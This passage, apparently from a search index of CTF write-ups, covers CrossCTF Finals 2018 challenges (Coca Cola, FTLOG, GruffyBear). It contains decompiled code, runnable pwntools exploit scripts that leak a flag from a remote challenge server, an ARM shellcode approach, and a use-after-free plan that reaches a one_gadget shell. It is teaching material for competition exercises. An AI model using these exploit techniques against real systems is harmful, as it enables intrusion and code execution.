as long as the state is stored within the function itself. We will do that, and things should get a lot simpler. The crank() code still looks really bad, so we can begin by simplifying the code. The code looks suspiciously like disassembled nested while loops, so I started with that concept, then made crank() return the flag instead of just shoving into a variable. def crank(): flag = '' for level in range(1,13): prod=1 for curr in range(1, (1<<level)+1): fmax = 5**curr+1 for f9f in range(fmax) prod *= f9f while prod % 10 == 0: prod = prod // 10 flag+= str(prod%1000).rjust(3,'0') return flag The innermost for loop can be simplified, so the code can be: def crank(): flag = '' for level in range(1,13): prod=1 for curr in range(1, (1<<level)+1): prod *= factorial(curr) while prod % 10 == 0: prod = prod // 10 flag+= str(prod%1000).rjust(3,'0') return flag where factorial is the factorial function, which I created to be a simple for-loop instead of recursion (python and its stack ;-;). That's not the real problem of course. It took wayyyy to long. Of course, it's because we are going to call factorial(5**(1<<level)), which will take toooooo long. I was going to use Wolfram Alpha's API to get the factorial of those large numbers, when I realised there was a pattern in the factorials of (5* i): the last 3 digits are repeating (984, 088, 016, 912), except for factorial(5* 1) which is 120. Since the flag only cares about the last 3 digits of prod, which is the multiplication of all factorials of (5**i) in the range [1 to 1<<level], we can replace the factorial function with one that gives only the last 3 digits: def factorial(g): if g == 1: return 120 else: return [984, 88, 16, 912][(g-2)%4] The final code is in here","title":"Static Analysis"},{"location":"crossctf-finals2018/pwn/cocacola/","text":"CrossCTF Finals 2018 : Coca Cola (Pwn) First Blood by : TinyBoxer Catch the Wave. Coke! nc ctf.pwn.sg 4001 Creator - amon (@nn_amon) Static Analysis Running file cocacola gives: cocacola: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76986b77e7025662406398594dd7c100f7e35c16, not stripped Now on to the code ... int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int result; // eax __off_t v5; // rsi int fd; // [rsp+Ch] [rbp-B4h] struct stat stat_buf; // [rsp+20h] [rbp-A0h] unsigned __int64 v8; // [rsp+B8h] [rbp-8h] v8 = __readfsqword(0x28u); // these are canaries btw setvbuf(stdin, 0LL, 2, 0LL); //disallows buffering setvbuf(stdout, 0LL, 2, 0LL);//disallows buffering setvbuf(stderr, 0LL, 2, 0LL);//disallows buffering v3 = time(0LL); srand(v3); //initalize random seed fd = open(\"flag_page\", 0, 384LL); memset(&stat_buf, 0, sizeof(stat_buf)); if ( fstat(fd, &stat_buf) == -1 ) { perror(\"Error getting the file size\"); result = -1; } else { v5 = stat_buf.st_size; mmap((void *)0x700B1000, stat_buf.st_size, 1, 1, fd, 0LL); printf(\"Do you want to flip the flag switch? (y/n) \"); __isoc99_scanf((__int64)\"%2s\", (__int64)&flag); coca(); cola(); puts(\"Did you get it? If not try again.\"); result = 0; } return result; } The program opens a file called flag_page . It clears out a stat_buf region of memory, then uses as a stat struct when fstat(fd, &stat_buf) is called. If fstat succeeds, mmap(0x700B100, stats_buf.size, 1, 1, fd, 0) is called. Looking at mmap documentation , we see that the two 1 s that are in the earlier mmap call are for the prot and flags arguments. However, note that for the fd argument, we are passing flag_page 's fd, intending to copy the file content into our allocated memory. Next, it asks us about flipping flag switches (to which the answer is not y , as we will see later). It reads in 2 bytes into the flag global variable then proceeds to call coca() and then cola() unsigned __int64 coca() { char buf; // [rsp+0h] [rbp-110h] unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); puts(art); read(0, &buf, 0xFFuLL); if ( flag_denied == 0xC5u ) read(0, &something, 1uLL); return __readfsqword(0x28u) ^ v2; } We begin by printing some pretty art, after which we read in 255 bytes into memory. Checking the offsets, we see that there is no overflow here. Next, a global variable flag_denied is compared to 0xc5 , and if it equal we read 1 byte into something , another global variable. unsigned __int64 cola() { int v0; // eax signed __int64 v2; // [rsp+0h] [rbp-60h] signed __int64 v3; // [rsp+8h] [rbp-58h] __int64 v4; // [rsp+10h] [rbp-50h] __int64 v5; // [rsp+18h] [rbp-48h] __int64 v6; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] __int64 v8; // [rsp+30h] [rbp-30h] int v9; // [rsp+38h] [rbp-28h] __int16 v10; // [rsp+3Ch] [rbp-24h] const char *v11; // [rsp+48h] [rbp-18h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); v0 = rand(); v3 = v0 - 10000000000LL * (((signed __int64)((unsigned __int128)(0x36F9BFB3AF7B757LL * (signed __int128)v0) >> 64) >> 27) - ((signed __int64)v0 >> 63)) + 1; if ( something ) { v2 = '\\x137'; strcpy(v4, \"Limited Edition Coca Cola - Product of Mexico\"); v11 = (__int64)\"Invalid internal error.\"; } puts(\"Here's your randomly generated coke can!\"); printf(\"Version: V.%lu\\n\", v2, v2); printf(\"Serial Number: %lu\\n\", v3); printf(\"Title: %s\\n\", &v4); if ( flag == 0x44 && v11 ) { puts(\"Errors were found.\"); printf(\"Error: %s\\n\", v11); } return __readfsqword(0x28u) ^ v12; } In this method, we get a random number then do some math to get produce another value, then save it into v3 . If something is true, we initalize variables v2 , v4 and v11 . Note that v11 has a pointer to some string, not the string itself. Next, we print out some info, then check if the flag variable is 0x44 and if v11 isn't NULL , and print v11 out in a print(\"Error: %s\\n\") . Solution We see that if something is 0 , when we print out info in cola() , it prints out values that are uninitialized. Usually, these are values from the previous function call that is made at the same 'level' as the current function (e.g main->coca is on the same 'level' as main->cola but main->cola is not on the same 'level' as main->cola->puts). That function is coca() , based on main()'s code. If we look at the read(0, &buf, 0xff) , we see that it reads 0xff bytes into buf, which is at rbp-0x110. All the variables in cola() are from rbp-0x60 onwards, so we can see that we can control all the variables in cola except v0 , v3 and v12 . Note that cola() prints out v11 in printf(\"Error: %s\\n\", v11) , interpreting it as a string, as long as flag is 0x44 . Thus, we can print out arbitrary memory since we can control v11! We can even print out the contents of flag_page by setting v11 to 0x700B1000 So far, we need to set flag to 0x44 , something to 0, and we also need to set v11 to 0x700B10000 (this can be done in coca() 's read(0, &buf, 0xff) ) Checking the program, we see that something is actually 1 by default .data:00000000002117F8 something db 1 The only place we can change something is in coca() : if ( flag_denied == 0xC5u ) read(0, &something, 1uLL); and it seems we need to set flag_denied to 0xc5 first. However, flag_denied is 0 by default, and there is no other place where it is set: .bss:00000000002117FD public flag .bss:00000000002117FD flag db ? ; ; DATA XREF: cola+12E\u2191o .bss:00000000002117FD ; main+14A\u2191o .bss:00000000002117FE public flag_denied .bss:00000000002117FE flag_denied db ? ; ; DATA XREF: coca+42\u2191o .bss:00000000002117FF db ? ; Hold on, dont we read 2 bytes into flag in main() ? Here it says that flag is only 1 byte (Note the addresses in left. My tool repeats addresses when delivering information to give .. more information). Thus, we have a overflow, and we can write 1 byte into flag_denied . So far, the plan is: Set flag and flag_denied to 0x44 and 0xc5 respectively, by sending \\x44\\xc5 to __isoc99_scanf((__int64)\"%2s\", (__int64)&flag); in main() . Then, set v11 (at rbp-0x18) to 0x700B1000 in read(0, &buf, 0xff) in coca() (buf is rbp-0x110, so we have 0x110-0x18 = 0xf8 characters of padding). Thus, we send 'a'*0xf8+p64(0x700B1000+i*32)[:-1] . The [:-1] is to leave out the last character, as p64() gives 8 bytes but we can only afford to send 7 bytes (0ff-0f8 = 7). Next, we send \\x00 to read(0, &something, 1) Putting it all together: from pwn import * p = remote('ctf.pwn.sg', 4001) p.sendafter(\"Do you want to flip the flag switch? (y/n) \", '\\x44\\xC5') p.send('a'*0xf8+p64(0x700B1000)[:-1]) p.send('\\x00') p.recvuntil('Error: ') print(p.recvline()) However ... we get 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC', which isn't the flag, obviously. But 'C' is the first letter of the flag that we expect. Perhaps the file has null bytes that force printf() to stop printing, and the each character of the flag is repeated as above, followed by a null byte? This, along with the puts(\"Did you get it? If not try again.\"); in main() imply that we have to repeat our exploit for each character in the flag (we also need to offset our value to v11 by 32*i, where i is the index of the character). Since we don't know how long the flag is, we just repeat our exploit, for example, 50 times and print what we have so far if the program segfaults early. from pwn import * s = '' for i in range(50): try: p = remote('ctf.pwn.sg', 4001) p.sendafter(\"Do you want to flip the flag switch? (y/n) \", '\\x44\\xC5') p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1]) p.send('\\x00') p.recvuntil('Error: ') s += p.recv(1) except: break print(s)","title":"Coca Cola"},{"location":"crossctf-finals2018/pwn/cocacola/#crossctf-finals-2018-coca-cola-pwn","text":"","title":"CrossCTF Finals 2018 : Coca Cola (Pwn)"},{"location":"crossctf-finals2018/pwn/cocacola/#first-blood-by-tinyboxer","text":"Catch the Wave. Coke! nc ctf.pwn.sg 4001 Creator - amon (@nn_amon)","title":"First Blood by : TinyBoxer"},{"location":"crossctf-finals2018/pwn/cocacola/#static-analysis","text":"Running file cocacola gives: cocacola: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76986b77e7025662406398594dd7c100f7e35c16, not stripped Now on to the code ... int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int result; // eax __off_t v5; // rsi int fd; // [rsp+Ch] [rbp-B4h] struct stat stat_buf; // [rsp+20h] [rbp-A0h] unsigned __int64 v8; // [rsp+B8h] [rbp-8h] v8 = __readfsqword(0x28u); // these are canaries btw setvbuf(stdin, 0LL, 2, 0LL); //disallows buffering setvbuf(stdout, 0LL, 2, 0LL);//disallows buffering setvbuf(stderr, 0LL, 2, 0LL);//disallows buffering v3 = time(0LL); srand(v3); //initalize random seed fd = open(\"flag_page\", 0, 384LL); memset(&stat_buf, 0, sizeof(stat_buf)); if ( fstat(fd, &stat_buf) == -1 ) { perror(\"Error getting the file size\"); result = -1; } else { v5 = stat_buf.st_size; mmap((void *)0x700B1000, stat_buf.st_size, 1, 1, fd, 0LL); printf(\"Do you want to flip the flag switch? (y/n) \"); __isoc99_scanf((__int64)\"%2s\", (__int64)&flag); coca(); cola(); puts(\"Did you get it? If not try again.\"); result = 0; } return result; } The program opens a file called flag_page . It clears out a stat_buf region of memory, then uses as a stat struct when fstat(fd, &stat_buf) is called. If fstat succeeds, mmap(0x700B100, stats_buf.size, 1, 1, fd, 0) is called. Looking at mmap documentation , we see that the two 1 s that are in the earlier mmap call are for the prot and flags arguments. However, note that for the fd argument, we are passing flag_page 's fd, intending to copy the file content into our allocated memory. Next, it asks us about flipping flag switches (to which the answer is not y , as we will see later). It reads in 2 bytes into the flag global variable then proceeds to call coca() and then cola() unsigned __int64 coca() { char buf; // [rsp+0h] [rbp-110h] unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); puts(art); read(0, &buf, 0xFFuLL); if ( flag_denied == 0xC5u ) read(0, &something, 1uLL); return __readfsqword(0x28u) ^ v2; } We begin by printing some pretty art, after which we read in 255 bytes into memory. Checking the offsets, we see that there is no overflow here. Next, a global variable flag_denied is compared to 0xc5 , and if it equal we read 1 byte into something , another global variable. unsigned __int64 cola() { int v0; // eax signed __int64 v2; // [rsp+0h] [rbp-60h] signed __int64 v3; // [rsp+8h] [rbp-58h] __int64 v4; // [rsp+10h] [rbp-50h] __int64 v5; // [rsp+18h] [rbp-48h] __int64 v6; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] __int64 v8; // [rsp+30h] [rbp-30h] int v9; // [rsp+38h] [rbp-28h] __int16 v10; // [rsp+3Ch] [rbp-24h] const char *v11; // [rsp+48h] [rbp-18h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); v0 = rand(); v3 = v0 - 10000000000LL * (((signed __int64)((unsigned __int128)(0x36F9BFB3AF7B757LL * (signed __int128)v0) >> 64) >> 27) - ((signed __int64)v0 >> 63)) + 1; if ( something ) { v2 = '\\x137'; strcpy(v4, \"Limited Edition Coca Cola - Product of Mexico\"); v11 = (__int64)\"Invalid internal error.\"; } puts(\"Here's your randomly generated coke can!\"); printf(\"Version: V.%lu\\n\", v2, v2); printf(\"Serial Number: %lu\\n\", v3); printf(\"Title: %s\\n\", &v4); if ( flag == 0x44 && v11 ) { puts(\"Errors were found.\"); printf(\"Error: %s\\n\", v11); } return __readfsqword(0x28u) ^ v12; } In this method, we get a random number then do some math to get produce another value, then save it into v3 . If something is true, we initalize variables v2 , v4 and v11 . Note that v11 has a pointer to some string, not the string itself. Next, we print out some info, then check if the flag variable is 0x44 and if v11 isn't NULL , and print v11 out in a print(\"Error: %s\\n\") .","title":"Static Analysis"},{"location":"crossctf-finals2018/pwn/cocacola/#solution","text":"We see that if something is 0 , when we print out info in cola() , it prints out values that are uninitialized. Usually, these are values from the previous function call that is made at the same 'level' as the current function (e.g main->coca is on the same 'level' as main->cola but main->cola is not on the same 'level' as main->cola->puts). That function is coca() , based on main()'s code. If we look at the read(0, &buf, 0xff) , we see that it reads 0xff bytes into buf, which is at rbp-0x110. All the variables in cola() are from rbp-0x60 onwards, so we can see that we can control all the variables in cola except v0 , v3 and v12 . Note that cola() prints out v11 in printf(\"Error: %s\\n\", v11) , interpreting it as a string, as long as flag is 0x44 . Thus, we can print out arbitrary memory since we can control v11! We can even print out the contents of flag_page by setting v11 to 0x700B1000 So far, we need to set flag to 0x44 , something to 0, and we also need to set v11 to 0x700B10000 (this can be done in coca() 's read(0, &buf, 0xff) ) Checking the program, we see that something is actually 1 by default .data:00000000002117F8 something db 1 The only place we can change something is in coca() : if ( flag_denied == 0xC5u ) read(0, &something, 1uLL); and it seems we need to set flag_denied to 0xc5 first. However, flag_denied is 0 by default, and there is no other place where it is set: .bss:00000000002117FD public flag .bss:00000000002117FD flag db ? ; ; DATA XREF: cola+12E\u2191o .bss:00000000002117FD ; main+14A\u2191o .bss:00000000002117FE public flag_denied .bss:00000000002117FE flag_denied db ? ; ; DATA XREF: coca+42\u2191o .bss:00000000002117FF db ? ; Hold on, dont we read 2 bytes into flag in main() ? Here it says that flag is only 1 byte (Note the addresses in left. My tool repeats addresses when delivering information to give .. more information). Thus, we have a overflow, and we can write 1 byte into flag_denied . So far, the plan is: Set flag and flag_denied to 0x44 and 0xc5 respectively, by sending \\x44\\xc5 to __isoc99_scanf((__int64)\"%2s\", (__int64)&flag); in main() . Then, set v11 (at rbp-0x18) to 0x700B1000 in read(0, &buf, 0xff) in coca() (buf is rbp-0x110, so we have 0x110-0x18 = 0xf8 characters of padding). Thus, we send 'a'*0xf8+p64(0x700B1000+i*32)[:-1] . The [:-1] is to leave out the last character, as p64() gives 8 bytes but we can only afford to send 7 bytes (0ff-0f8 = 7). Next, we send \\x00 to read(0, &something, 1) Putting it all together: from pwn import * p = remote('ctf.pwn.sg', 4001) p.sendafter(\"Do you want to flip the flag switch? (y/n) \", '\\x44\\xC5') p.send('a'*0xf8+p64(0x700B1000)[:-1]) p.send('\\x00') p.recvuntil('Error: ') print(p.recvline()) However ... we get 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC', which isn't the flag, obviously. But 'C' is the first letter of the flag that we expect. Perhaps the file has null bytes that force printf() to stop printing, and the each character of the flag is repeated as above, followed by a null byte? This, along with the puts(\"Did you get it? If not try again.\"); in main() imply that we have to repeat our exploit for each character in the flag (we also need to offset our value to v11 by 32*i, where i is the index of the character). Since we don't know how long the flag is, we just repeat our exploit, for example, 50 times and print what we have so far if the program segfaults early. from pwn import * s = '' for i in range(50): try: p = remote('ctf.pwn.sg', 4001) p.sendafter(\"Do you want to flip the flag switch? (y/n) \", '\\x44\\xC5') p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1]) p.send('\\x00') p.recvuntil('Error: ') s += p.recv(1) except: break print(s)","title":"Solution"},{"location":"crossctf-finals2018/pwn/ftlog/","text":"CrossCTF Finals 2018 : FTLOG (Pwn) First Blood by : OSI Layer 8 https://youtu.be/RW2vXFLXtps nc ctf.pwn.sg 4004 Hint: The raspberry Pis might come in handy but you can look at using qemu too. Creator - amon (@nn_amon) Static Analysis Running file ftlog gives: ftlog: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=c3d8b29303d27686f7190bf2e3d88fc857517a3b, not stripped The binary is ARM, so I expected it to be hard to run/debug the program locally. Luckily, pwntools can emulate other architectures using qemu , so at the very least we can run the challenge locally. The code for the challenge is as follows: int __cdecl main(int argc, const char **argv, const char **envp) { void (__fastcall *v3)(int); // ST00_4 int v4; // r0 puts(&art, argv, envp); v3 = (void (__fastcall *)(int))malloc(512); mprotect(v3, 512, 7); v4 = read(0, v3, 512); v3(v4); return 0; } The prints out some art , then allocates memory and marks it as executable ( mprotect(v3, 512, 7) => mprotect(memory, memory_size, PROT_READ | PROT_WRITE | PROT_EXEC) ). Then, it reads in some input to the memory and executes our input. In other words, this is a simple shellcode challenge, but for ARM. Solution The solution is to simply send in some ARM shellcode to spawn shell, then interact with it. Solution code in here P.S. I still have no idea what the YouTube link is for","title":"FTLOG"},{"location":"crossctf-finals2018/pwn/ftlog/#crossctf-finals-2018-ftlog-pwn","text":"","title":"CrossCTF Finals 2018 : FTLOG (Pwn)"},{"location":"crossctf-finals2018/pwn/ftlog/#first-blood-by-osi-layer-8","text":"https://youtu.be/RW2vXFLXtps nc ctf.pwn.sg 4004 Hint: The raspberry Pis might come in handy but you can look at using qemu too. Creator - amon (@nn_amon)","title":"First Blood by : OSI Layer 8"},{"location":"crossctf-finals2018/pwn/ftlog/#static-analysis","text":"Running file ftlog gives: ftlog: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=c3d8b29303d27686f7190bf2e3d88fc857517a3b, not stripped The binary is ARM, so I expected it to be hard to run/debug the program locally. Luckily, pwntools can emulate other architectures using qemu , so at the very least we can run the challenge locally. The code for the challenge is as follows: int __cdecl main(int argc, const char **argv, const char **envp) { void (__fastcall *v3)(int); // ST00_4 int v4; // r0 puts(&art, argv, envp); v3 = (void (__fastcall *)(int))malloc(512); mprotect(v3, 512, 7); v4 = read(0, v3, 512); v3(v4); return 0; } The prints out some art , then allocates memory and marks it as executable ( mprotect(v3, 512, 7) => mprotect(memory, memory_size, PROT_READ | PROT_WRITE | PROT_EXEC) ). Then, it reads in some input to the memory and executes our input. In other words, this is a simple shellcode challenge, but for ARM.","title":"Static Analysis"},{"location":"crossctf-finals2018/pwn/ftlog/#solution","text":"The solution is to simply send in some ARM shellcode to spawn shell, then interact with it. Solution code in here P.S. I still have no idea what the YouTube link is for","title":"Solution"},{"location":"crossctf-finals2018/pwn/gruffybear/","text":"CrossCTF Finals 2018 : GruffyBear (Pwn) First Blood by : N0X10U5 G4S3S There's something fishy about this Build-A-Bear workshop... nc ctf.pwn.sg 4002 Creator - amon (@nn_amon) Static Analysis Running file gruffybear gives: gruffybear: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=405edd7cd41e309d1cab442ffc6a6dad8e782908, not stripped The code: int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+4h] [rbp-24h] unsigned __int64 v5; // [rsp+8h] [rbp-20h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); v4 = 999; alarm(0x3Cu); LABEL_2: while ( v4 ) { while ( 2 ) { print_banner(); _isoc99_scanf(\"%d\", &v4); switch ( v4 ) { case 1: build_bear(); goto LABEL_2; case 2: select_bear(); goto LABEL_2; case 3: delete_bear(); goto LABEL_2; case 4: print_bear(); goto LABEL_2; case 5: add_comment(); goto LABEL_2; case 6: print_comment(); goto LABEL_2; case 7: destruction(); if ( !v4 ) return 0; continue; default: puts(\"Nothing to do.\"); break; } break; } } return 0; } main() does some setup like turning off buffering, and calling alarm(0x3cu) . This sets us on a time limit, after which the program will crash. Make sure to nop the call to alarm() using your tool. e.g. in radare2 you would go to the address of the call then wx 9090909090 . In a loop, we print a banner, then get input. Based on the input, we call functions. This is a typical menu-based cli program. unsigned __int64 build_bear() { __int64 v0; // rbp bear *v1; // rbx const char *v3; // rbx char buf; // [rsp+7h] [rbp-21h] unsigned __int64 v5; // [rsp+8h] [rbp-20h] v5 = __readfsqword(0x28u); v0 = num_bears[0]; if ( num_bears[0] > 12 ) { v3 = \"SUNIATRETNE\"; _printf_chk(1LL, \"Here we are now... \"); while ( 1 ) { read(0, &buf, 1uLL); if ( v3[10] != buf ) break; if ( --v3 == \"nt\" ) { read(0, &buf, 1uLL); admin_enabled = 1; return __readfsqword(0x28u) ^ v5; } } } else { v1 = (bear *)calloc(1uLL, 0xB8uLL); bears[v0] = v1; _printf_chk(1LL, \"Bear Name: \"); read(0, v1, 0x1FuLL); _printf_chk(1LL, \"Bear ID: \"); _isoc99_scanf(\"%x\", &v1->id); _printf_chk(1LL, \"Bear Age: \"); _isoc99_scanf(\"%d\", &v1->age); _printf_chk(1LL, \"Bear Description: \"); read(0, v1->description, 0x80uLL); v1->free_function = (__int64)&free; v1->self_destruct_device_ptr = (__int64)self_destruct_device; puts(\"Bear created!\"); ++num_bears[0]; } return __readfsqword(0x28u) ^ v5; } The typical functionality of build_bear() is to allocate 0xb8 size of memory using malloc() then initialize it using user-provided values, then set the global bears array's last unused element to our the address of the bear ( bears[v0]=v1 , where v0 is the ```num_bears). The 'bear' struct seems to as follows: struct bear{ char name[32]; int id; int age; char desc[128]; void* free_ptr; void* self_destruct_device_ptr; } Once we have 13 bears built already, we enter some sort of secret section, which lets us set admin_enabled to 1, as long as we satisfy some checks. In short, what the checks really want are the characters of \"SUNIATRETNE\" in reverse. IDA Pro sometimes goofs up its decompiler. What the v3-- == \"nt\" really means is v3-- == (__int64)SUNIATRETNE\"-1 , or whether v3-- points to the byte before the \"S\". The above can be simplified to v3 = (__int64)\"SUNIATRETNE\"; // v3 is a POINTER _printf_chk(1LL, \"Here we are now... \"); while ( 1 ) { read(0, &buf, 1uLL); if ( v3[10] != buf ) break; if ( --v3 == (__int64)\"SUNIATRETNE\"-1) { read(0, &buf, 1uLL); admin_enabled = 1; return __readfsqword(0x28u) ^ v5; } } On to the next function ... unsigned __int64 select_bear() { unsigned int v1; // [rsp+4h] [rbp-14h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); v1 = 0; _printf_chk(1LL, \"Selection: \"); _isoc99_scanf(\"%d\", &v1); if ( (v1 & 0x80000000) == 0 && v1 < *num_bears ) selected_bear = (void *)bears[v1]; else puts(\"Not enough bears.\"); return __readfsqword(0x28u) ^ v2; } The program reads in a number, lets say a . If it is not negative and if it is lesser than num_bears, selected_bear will now have a copy of the pointer to the bear at index a . Else, it prints out \"Not enough bears\". (v1 & 0x800000000)==0 means first bit of v1 == 0 , and the first bit of a integer is its sign bit, according to 2s complement notation. int delete_bear() { if ( !selected_bear ) return puts(\"No bear selected!\"); _printf_chk(1LL, \"Deleting [%s]...\\n\"); if ( (void (**)(void *))selected_bear->free_function == &free ) free(selected_bear); return puts(\"Deleted!\"); } The function free()'s the pointer in selected_bear , as long as the free_function still points to free. The selected_bear is not zero'ed out. The bears[idx] is not zero'ed out. This challenge is a typical UAF challenge. num_bears is not decremented int print_bear() { __int64 v0; // rdx __int64 v1; // rdx if ( !selected_bear ) return puts(\"No bear selected!\"); puts(art); _printf_chk(1LL, \"You have selected: [%s]\\n\"); v0 = (unsigned int)selected_bear->id; _printf_chk(1LL, \"It's ID is %x\\n\"); v1 = (unsigned int)selected_bear->age; _printf_chk(1LL, \"It's AGE is %d\\n\"); return _printf_chk(1LL, \"It's DESCRIPTION is %s\\n\"); } This function just prints out information about the selected_bear . unsigned __int64 add_comment() { unsigned int nbytes; _printf_chk(1LL, \"How long should the comment be: \"); _isoc99_scanf(\"%d\", &nbytes); comment = calloc(nbytes + 1, 1uLL); _printf_chk(1LL, \"Comment: \"); read(0, comment, nbytes[0]); return; } Here comes the main tool to exploit the UAF vulneraribility. This function reads in a number then calls calloc(nbytes+1, 1) , which is the same as malloc(nbytes+1) . If we delete_bear() then add_comment() of size 0xb8-1 , we can control ALL OF THE BEAR, including its self_destruct_device_ptr , which will be called later on... Insert evil laugh here int print_comment() { int result; // eax if ( comment ) result = puts((const char *)comment); else result = puts(\"No\"); return result; } Pretty basic, prints the comment or prints \"No\" if theres no comment. int destruction() { int result; // eax if ( !admin_enabled ) return puts(\"Nothing to do\"); result = (signed int)selected_bear; if ( selected_bear ) result = (selected_bear->self_destruct_device_ptr)(*num_bears); return result; } If admin_enabled is true and selected_bear is valid, we can execute selected_bear 's self_destruct_device_ptr Solution As mentioned earlier, this is a typical UAF challenge. The obvious steps so far are: 1. Build Bear 1. Put arbitrary data 2. Select Bear 1. Select 0 3. Delete Bear 4. Add Comment 1. The size of the comment must be 0xb8-1 , so that we calloc(0xb8,1) and so that it will reuse the free memory that belonged to bears[0] 2. We can send 0xb0 arbitrary bytes, then send our desired function pointer, let's say, 0xcafebabe 5. We call Build Bear 12 more times 1. Put arbitrary data again 6. Build Bear (we already have 13 bears, this will go to the secret section now) 1. This time, we send SUNIATRETNE in reverse, and this will set admin_enabled to 1 7. Destruction Now the question is, what do we want to execute? There isn't any function that can give shell, and we don't know the address of any function since it is a PIE binary anyway $ checksec gruffybear Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Lets go hunting for a leak! Actually thats really easy, since we are freeing a smallbin-sized chunk (0xb8 = 184) . If you see the structure of a free malloc_chunk in the smallbin size range, the first 8 bytes are a pointer to the smallbin, called fd , which are the first 8 bytes of the bear's name. To do this, we need to allocate another chunk first (build another bear) so that the chunk above ours is not the top chunk. We can use print_bear() to leak this address, then call a libc function. So now, do we call system()? We can't though, since we are passing the num_bears as its argument. Instead, we can use something called 'magic gadgets', which are places in libc we can jump to so that we can instantly get shell as long as some constraints are valid. I use the tool one_gadget to do this. $ one_gadget libc-2.23.so 0x45216 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4526a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1147 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL I chose the second last one (it was at random) So now, our steps are as follows 1. Build Bear 1. Put arbitrary data 1. Build Bear 1. Put arbitrary data 2. Select Bear 1. Select 0 3. Delete Bear 4. Print Bear 1. This will give us the libc smallbin address for size 0xb8 (in the name) 2. This address is also 0x70+__realloc_hook, which was the calculation I used 4. Add Comment 1. The size of the comment must be 0xb8-1 , so that we calloc(0xb8,1) and so that it will reuse the free memory that belonged to bears[0] 2. We can send 0xb0 arbitrary bytes, then send our desired function pointer, which is libc_base+0xf02a4 3. It only reads in 0xb7 bytes, so remember to remove the last byte from the input (its a null byte anyway) 5. We call Build Bear 11 more times 1. Put arbitrary data again 6. Build Bear (we already have 13 bears, this will go to the secret section now) 1. This time, we send SUNIATRETNE in reverse, and this will set admin_enabled to 1 7. Destruction The final solution is in here","title":"GruffyBear"},{"location":"crossctf-finals2018/pwn/gruffybear/#crossctf-finals-2018-gruffybear-pwn","text":"","title":"CrossCTF Finals 2018 : GruffyBear (Pwn)"},{"location":"crossctf-finals2018/pwn/gruffybear/#first-blood-by-n0x10u5-g4s3s","text":"There's something fishy about this Build-A-Bear workshop... nc ctf.pwn.sg 4002 Creator - amon (@nn_amon)","title":"First Blood by : N0X10U5 G4S3S"},{"location":"crossctf-finals2018/pwn/gruffybear/#static-analysis","text":"Running file gruffybear gives: gruffybear: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=405edd7cd41e309d1cab442ffc6a6dad8e782908, not stripped The code: int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+4h] [rbp-24h] unsigned __int64 v5; // [rsp+8h] [rbp-20h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); v4 = 999; alarm(0x3Cu); LABEL_2: while ( v4 ) { while ( 2 ) { print_banner(); _isoc99_scanf(\"%d\", &v4); switch ( v4 ) { case 1: build_bear(); goto LABEL_2; case 2: select_bear(); goto LABEL_2; case 3: delete_bear(); goto LABEL_2; case 4: print_bear(); goto LABEL_2; case 5: add_comment(); goto LABEL_2; case 6: print_comment(); goto LABEL_2; case 7: destruction(); if ( !v4 ) return 0; continue; default: puts(\"Nothing to do.\"); break; } break; } } return 0; } main() does some setup like turning off buffering, and calling alarm(0x3cu) . This sets us on a time limit, after which the program will crash. Make sure to nop the call to alarm() using your tool. e.g. in radare2 you would go to the address of the call then wx 9090909090 . In a loop, we print a banner, then get input. Based on the input, we call functions. This is a typical menu-based cli program. unsigned __int64 build_bear() { __int64 v0; // rbp bear *v1; // rbx const char *v3; // rbx char buf; // [rsp+7h] [rbp-21h] unsigned __int64 v5; // [rsp+8h] [rbp-20h] v5 = __readfsqword(0x28u); v0 = num_bears[0]; if ( num_bears[0] > 12 ) { v3 = \"SUNIATRETNE\"; _printf_chk(1LL, \"Here we are now... \"); while ( 1 ) { read(0, &buf, 1uLL); if ( v3[10] != buf ) break; if ( --v3 == \"nt\" ) { read(0, &buf, 1uLL); admin_enabled = 1; return __readfsqword(0x28u) ^ v5; } } } else { v1 = (bear *)calloc(1uLL, 0xB8uLL); bears[v0] = v1; _printf_chk(1LL, \"Bear Name: \"); read(0, v1, 0x1FuLL); 